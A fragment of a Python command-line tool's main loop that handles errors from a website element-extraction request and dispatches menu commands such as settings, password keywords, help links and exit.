                    print(f'{green}𝙽𝚞𝚖𝚋𝚎𝚛 𝚘𝚏 𝚎𝚕𝚎𝚖𝚎𝚗𝚝𝚜 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 = {len(elements_extracted)}{plain}')
                  
          except requests.exceptions.ConnectionError:
            print(f'{red} Connection error{plain}')
          except requests.exceptions.Timeout:
            print(f'{red} Connection timeout...Please try again{plain}')
          except requests.exceptions.RequestException as e:
            print(f'{red} An error occurred : {e}')
        else:
          if not website.lower() == 'exit':
            print(f'{red} Invalid web address i.e https://example.com{plain}')
          
      
    elif command.lower() in ['setting', 'settings']:
      open_settings(modify = True)
    elif command.lower().strip() == 'password':
      take_keywords()
    elif command.lower().strip() == 'help':
      subprocess.run(['xdg-open', 'https://github.com/harkerbyte/linux-monster#support'])
    elif command.lower() == 'clear':
      load_banner()
    elif command.lower() in ['dev', 'developer']:
      subprocess.run(['xdg-open', 'https://github.com/harkerbyte'])

      
    elif command.lower() == 'exit':
      print(f'{green}See yah later👋{plain}')
      command = False
      break
    
      
if __name__ == "__main__":
  main()